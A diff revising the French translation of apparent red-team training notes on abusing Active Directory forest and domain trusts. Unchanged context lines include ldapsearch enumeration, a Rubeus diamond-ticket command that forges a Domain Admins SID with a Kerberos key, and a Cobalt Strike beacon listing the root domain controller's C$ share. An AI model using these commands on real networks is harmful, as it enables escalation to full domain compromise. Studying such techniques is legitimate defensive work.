@@ -1,9 +1,9 @@
-# Forest & Domain Trusts
+# Relations de confiance entre domaines et forêts
 
-* Inter-Realm Tickets
-* Parent-Child Trusts
-* Inbound Trusts
-* ### Outbound Trusts
+* Tickets inter-realm
+* Relations de confiance parent-enfant
+* Relations de confiance entrantes
+* Relations de confiance sortantes
 
 ### Énumérer les Trusted Domain Objects
 
@@ -17,7 +17,7 @@ ldapsearch (objectClass=trustedDomain)
 ldapsearch (samAccountType=805306370) --attributes samAccountName
 ```
 
-### Identifier les Parent-Child Trusts
+### Identifier les relations de confiance parent-enfant
 
 ```
 ldapsearch (objectClass=trustedDomain)
@@ -39,11 +39,11 @@ Le SID du domaine parent peut être ajouté au ticket.
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
 ```  
 
-Une fois le ticket injecté dans la session de logon, il peut servir à accéder au Domain Controller racine de la forest.
+Une fois le ticket injecté dans la session de connexion, il peut servir à accéder au contrôleur de domaine racine de la forêt.
 
 beacon> ls \\lon-dc-1\c$
 
-### Outbound Trusts
+### Relations de confiance sortantes
 
 ```
 getuid
